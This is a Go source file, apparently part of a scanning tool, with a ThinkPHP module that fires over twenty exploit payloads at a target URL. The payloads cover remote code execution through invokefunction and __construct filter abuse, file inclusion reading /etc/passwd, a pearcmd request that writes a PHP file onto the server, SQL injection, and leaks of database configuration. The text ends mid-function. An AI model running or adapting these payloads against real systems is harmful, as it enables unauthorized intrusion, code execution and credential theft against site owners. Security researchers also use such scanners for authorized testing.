package Cms

import (
	"fmt"
	"github.com/imroc/req/v3"
	"golang.org/x/net/context"
	"strings"
	"time"
)

type ThinkPHP struct {
	Url     string
	Choose  string
	Thread  int
	Timeout int
	Payload string
	Result  chan string
}

func (thinkphp *ThinkPHP) ExpListInfoExploit() []string {
	return []string{
		"All",
		"LoadLangPack_lang",
		"tp6_session_file_write",
		"tp5_file_include",
		"tp5_session_include",
		"tp5_invoke_func_code_exec_1",
		"tp5_invoke_func_code_exec_2",
		"tp5_construct_code_exec_1",
		"tp5_construct_code_exec_2",
		"tp5_construct_code_exec_3",
		"tp5_construct_code_exec_4",
		"tp5_construct_debug_rce",
		"tp5_driver_display_rce",
		"tp5_index_construct_rce",
		"tp5_index_showid_rce",
		"tp5_request_input_rce",
		"tp5_method_filter_code_exec",
		"tp5_debug_index_ids_sqli",
		"tp5_templalte_driver_rce",
		"tp5_dbinfo_leak",
		"tp2_lite_code_exec",
		"tp_cache",
		"tp_checkcode_time_sqli",
		"tp_multi_sql_leak",
		"tp_pay_orderid_sqli",
		"tp_update_sql",
		"tp_view_recent_xff_sqli",
	}
}

func (thinkphp *ThinkPHP) RunExploit() {
	switch thinkphp.Choose {
	case "All":
		thinkphp.LoadLangPack_lang()
		thinkphp.tp6_session_file_write()
		thinkphp.tp5_file_include()
		thinkphp.tp5_session_include()
		thinkphp.tp5_invoke_func_code_exec_1()
		thinkphp.tp5_invoke_func_code_exec_2()
		thinkphp.tp5_construct_code_exec_1()
		thinkphp.tp5_construct_code_exec_2()
		thinkphp.tp5_construct_code_exec_3()
		thinkphp.tp5_construct_code_exec_4()
		thinkphp.tp5_construct_debug_rce()
		thinkphp.tp5_driver_display_rce()
		thinkphp.tp5_index_construct_rce()
		thinkphp.tp5_index_showid_rce()
		thinkphp.tp5_request_input_rce()
		thinkphp.tp5_method_filter_code_exec()
		thinkphp.tp5_debug_index_ids_sqli()
		thinkphp.tp5_templalte_driver_rce()
		thinkphp.tp5_dbinfo_leak()
		thinkphp.tp2_lite_code_exec()
		thinkphp.tp_cache()
		thinkphp.tp_checkcode_time_sqli()
		thinkphp.tp_multi_sql_leak()
		thinkphp.tp_pay_orderid_sqli()
		thinkphp.tp_update_sql()
		thinkphp.tp_view_recent_xff_sqli()
		break
	case "LoadLangPack_lang":
		thinkphp.LoadLangPack_lang()
		break
	case "tp6_session_file_write":
		thinkphp.tp6_session_file_write()
		break
	case "tp5_file_include":
		thinkphp.tp5_file_include()
		break
	case "tp5_session_include":
		thinkphp.tp5_session_include()
		break
	case "tp5_invoke_func_code_exec_1":
		thinkphp.tp5_invoke_func_code_exec_1()
		break
	case "tp5_invoke_func_code_exec_2":
		thinkphp.tp5_invoke_func_code_exec_2()
		break
	case "tp5_construct_code_exec_1":
		thinkphp.tp5_construct_code_exec_1()
		break
	case "tp5_construct_code_exec_2":
		thinkphp.tp5_construct_code_exec_2()
		break
	case "tp5_construct_code_exec_3":
		thinkphp.tp5_construct_code_exec_3()
		break
	case "tp5_construct_code_exec_4":
		thinkphp.tp5_construct_code_exec_4()
		break
	case "tp5_construct_debug_rce":
		thinkphp.tp5_construct_debug_rce()
		break
	case "tp5_driver_display_rce":
		thinkphp.tp5_driver_display_rce()
		break
	case "tp5_index_construct_rce":
		thinkphp.tp5_index_construct_rce()
		break
	case "tp5_index_showid_rce":
		thinkphp.tp5_index_showid_rce()
		break
	case "tp5_request_input_rce":
		thinkphp.tp5_request_input_rce()
		break
	case "tp5_method_filter_code_exec":
		thinkphp.tp5_method_filter_code_exec()
		break
	case "tp5_debug_index_ids_sqli":
		thinkphp.tp5_debug_index_ids_sqli()
		break
	case "tp5_templalte_driver_rce":
		thinkphp.tp5_templalte_driver_rce()
		break
	case "tp5_dbinfo_leak":
		thinkphp.tp5_dbinfo_leak()
		break
	case "tp2_lite_code_exec":
		thinkphp.tp2_lite_code_exec()
		break
	case "tp_cache":
		thinkphp.tp_cache()
		break
	case "tp_checkcode_time_sqli":
		thinkphp.tp_checkcode_time_sqli()
		break
	case "tp_multi_sql_leak":
		thinkphp.tp_multi_sql_leak()
		break
	case "tp_pay_orderid_sqli":
		thinkphp.tp_pay_orderid_sqli()
		break
	case "tp_update_sql":
		thinkphp.tp_update_sql()
		break
	case "tp_view_recent_xff_sqli":
		thinkphp.tp_view_recent_xff_sqli()
		break
	default:
		break
	}
}

// 任意文件包含漏洞
func (thinkphp *ThinkPHP) LoadLangPack_lang() {
	path := "/public/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php"

	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "LoadLangPack_lang检测失败", thinkphp.Url, err.Error())
		return
	}

	path = "/shell.php"

	resp, err = req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))

	if strings.Contains(resp.String(), "phpinfo()") {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s\n", "LoadLangPack_lang存在漏洞", thinkphp.Url)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "LoadLangPack_lang不存在漏洞", thinkphp.Url)
		return
	}
}

// 文件读取
func (thinkphp *ThinkPHP) tp6_session_file_write() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"Accept":     "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
		"Cookie":     "PHPSESSID=../../../../public/VdVR9VB.php",
		"Pragma":     "no-cache",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s/VdVR9VB.php", thinkphp.Url))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp6_session_file_write检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "a:1:{s:4:\"name\";s:8:\"thinkphp\";}") {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s\n", "tp6_session_file_write存在漏洞", thinkphp.Url)

		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp6_session_file_write不存在漏洞", thinkphp.Url)
		return
	}
}

// 文件包含
func (thinkphp *ThinkPHP) tp5_file_include() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	paths := []string{
		"?s=index/\\think\\Lang/load&file=/etc/passwd",
		"?s=index/\\think\\Lang/load&file=C:\\windows\\win.ini",
		"?s=index/\\think\\Config/load&file=/etc/passwd",
		"?s=index/\\think\\Config/load&file=C:\\windows\\win.ini",
	}

	for _, path := range paths {
		resp, err := req.SetHeaders(map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		}).SetContext(ctx).Get(fmt.Sprintf("%s/%s", thinkphp.Url, path))
		if err != nil {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_file_include检测失败", thinkphp.Url, err.Error())
			continue
		}

		if strings.Contains(resp.String(), "for 16-bit app support") == true || strings.Contains(resp.String(), "root") == true {
			thinkphp.Result <- fmt.Sprintf("[+]%s -> %s\n", "tp5_file_include存在漏洞", fmt.Sprintf("%s/%s\n", thinkphp.Url, path))
			continue
		} else {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_file_include不存在漏洞", thinkphp.Url)
			continue
		}
	}
}

func (thinkphp *ThinkPHP) tp5_session_include() {

	paths := []string{
		"/index.php?s=captcha",
		"/index.php/index",
	}
	payloads := []string{
		"_method=__construct&method=GET&filter[]=think\\__include_file&get[]=/tmp/sess_cvfm8xgtpwkqhae6umhfcjqmx&server[]=1",
		"_method=__construct&filter[]=think\\Session::set&method=get&get[]=test&server[]=1",
	}

	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	for _, path := range paths {
		for _, payload := range payloads {
			resp, err := req.SetHeaders(map[string]string{
				"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
				"Content-type": "application/x-www-form-urlencoded",
			}).SetContext(ctx).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
			if err != nil {
				thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_session_include检测失败", thinkphp.Url, err.Error())
				continue
			}

			if strings.Contains(resp.String(), "think|a:") == true {
				thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_session_include存在漏洞", thinkphp.Url, thinkphp.Payload)
				continue
			} else {
				thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_session_include不存在漏洞", thinkphp.Url)
				continue
			}
		}
	}
}

func (thinkphp *ThinkPHP) tp5_invoke_func_code_exec_1() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	thinkphp.Payload = "/index.php/?s=index/think\\app/invokefunction&function=phpinfo&vars[0]=-1"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, thinkphp.Payload))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_invoke_func_code_exec_1检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "PHP Version") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_invoke_func_code_exec_1存在漏洞", thinkphp.Url, thinkphp.Payload)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_invoke_func_code_exec_1不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_invoke_func_code_exec_2() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	thinkphp.Payload = "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, thinkphp.Payload))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_invoke_func_code_exec_2检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "56540676a129760a") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_invoke_func_code_exec_2存在漏洞", thinkphp.Url, thinkphp.Payload)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_invoke_func_code_exec_2不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_construct_code_exec_1() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=captcha"
	thinkphp.Payload = "_method=__construct&filter[]=var_dump&method=GET&server[REQUEST_METHOD]=dylan"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-type": "application/x-www-form-urlencoded",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_construct_code_exec_1检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_construct_code_exec_1存在漏洞", thinkphp.Url, thinkphp.Payload)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_construct_code_exec_1不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_construct_code_exec_2() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=captcha"
	thinkphp.Payload = "_method=__construct&method=GET&filter[]=var_dump&get[]=dylan"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-type": "application/x-www-form-urlencoded",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_construct_code_exec_2检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_construct_code_exec_2存在漏洞", thinkphp.Url, thinkphp.Payload)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_construct_code_exec_2不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_construct_code_exec_3() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=captcha"
	thinkphp.Payload = "s=dylan&_method=__construct&method=POST&filter[]=var_dump"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-type": "application/x-www-form-urlencoded",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_construct_code_exec_3检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_construct_code_exec_3存在漏洞", thinkphp.Url, thinkphp.Payload)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_construct_code_exec_3不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_construct_code_exec_4() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=captcha"
	thinkphp.Payload = "aaaa=dylan&_method=__construct&method=GET&filter[]=var_dump"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-type": "application/x-www-form-urlencoded",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_construct_code_exec_4检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_construct_code_exec_4存在漏洞", thinkphp.Url, thinkphp.Payload)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_construct_code_exec_4不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_construct_debug_rce() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php"
	thinkphp.Payload = "_method=__construct&filter[]=var_dump&server[REQUEST_METHOD]=dylan"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_construct_code_exec_4检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "string(5) \"dylan\"") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_construct_code_exec_4存在漏洞", thinkphp.Url, thinkphp.Payload)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_construct_code_exec_4不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_driver_display_rce() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_driver_display_rce检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "4f97319b308ed6bd3f0c195c176bbd77") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_driver_display_rce存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_driver_display_rce不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_index_construct_rce() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=index/index/index"
	payloads := []string{
		"s=Blo7x&_method=__construct&method&filter[]=var_dump",
		"s=Blo7x&_method=__construct&method=POST&filter[]=var_dump",
		"s=Blo7x&_method=__construct&method=GET&filter[]=var_dump",
		"_method=__construct&method=GET&filter[]=var_dump&get[]=Blo7x",
	}

	for _, payload := range payloads {
		resp, err := req.SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
		if err != nil {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_index_construct_rce检测失败", thinkphp.Url, err.Error())
			return
		}

		if strings.Contains(resp.String(), "string(5) \"") == true {
			thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_index_construct_rce存在漏洞", thinkphp.Url, path)
			return
		} else {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_index_construct_rce不存在漏洞", thinkphp.Url)
			return
		}
	}
}

func (thinkphp *ThinkPHP) tp5_index_showid_rce() {
	paths := []string{
		"/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]",
		"/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C23_02_19.log'",
	}

	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()

	for _, path := range paths {
		resp, err := req.SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
		if err != nil {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_index_showid_rce检测失败", thinkphp.Url, err.Error())
			return
		}

		if strings.Contains(resp.String(), "56540676a129760a3") == true {
			thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_index_showid_rce存在漏洞", thinkphp.Url, path)
			return
		} else {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_index_showid_rce不存在漏洞", thinkphp.Url)
			return
		}
	}
}

func (thinkphp *ThinkPHP) tp5_request_input_rce() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=index/\\think\\Request/input&filter=var_dump&data=md5(2333)"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_request_input_rce检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "f7e0b956540676a129760a3eae309294") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_request_input_rce存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_request_input_rce不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_method_filter_code_exec() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/public/index.php"
	thinkphp.Payload = "c=var_dump&f=md5(2333)&_method=filter"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_method_filter_code_exec检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "f7e0b956540676a129760a3eae309294") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_method_filter_code_exec存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_method_filter_code_exec不存在漏洞", thinkphp.Url)
		return
	}

}

func (thinkphp *ThinkPHP) tp5_debug_index_ids_sqli() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-type": "application/x-www-form-urlencoded",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_debug_index_ids_sqli检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "cf67355a3333e6e143439161adc2d82") == true {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_debug_index_ids_sqli存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_debug_index_ids_sqli不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp5_templalte_driver_rce() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	paths := []string{
		"/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=mqz.php&content=%3C?php%20var_dump(md5(2333));?%3E",
		"/mqz.php",
	}

	for _, path := range paths {
		resp, err := req.SetHeaders(map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
		if err != nil {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_templalte_driver_rce检测失败", thinkphp.Url, err.Error())
			continue
		}
		if strings.Contains(resp.String(), "56540676a129760a") == true {
			thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_templalte_driver_rce存在漏洞", thinkphp.Url, path)
			continue
		} else {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_templalte_driver_rce不存在漏洞", thinkphp.Url)
			continue
		}
	}
}

func (thinkphp *ThinkPHP) tp5_dbinfo_leak() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()

	paths := []string{
		"/?s=index/think\\config/get&name=database.username",
		"/?s=index/think\\config/get&name=database.database",
		"/?s=index/think\\config/get&name=database.hostport",
		"/?s=index/think\\config/get&name=database.hostname",
	}

	info := []string{
		"", // hostname
		"", // hostport
		"", // database
		"", // username
		"", // password
	}

	for index, path := range paths {
		resp, err := req.SetHeaders(map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
		if err != nil {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_dbinfo_leak检测失败", thinkphp.Url, err.Error())
			continue
		}

		info[index] = resp.String()
	}

	if info[0] == "" && info[1] == "" && info[2] == "" && info[3] == "" && info[4] == "" {
		if info[0] != info[4] {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_dbinfo_leak不存在漏洞", thinkphp.Url)
			return
		}
	} else {
		for _, path := range paths {
			thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_dbinfo_leak存在漏洞", thinkphp.Url, path)
		}
		return
	}
}

func (thinkphp *ThinkPHP) tp2_lite_code_exec() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp2_lite_code_exec检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "56540676a129760a3") {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp2_lite_code_exec存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp2_lite_code_exec不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp_cache() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php/Home/Index/index.html"
	thinkphp.Payload = "a3=%0d%0avar_dump(\"test\");%0d%0a//"
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
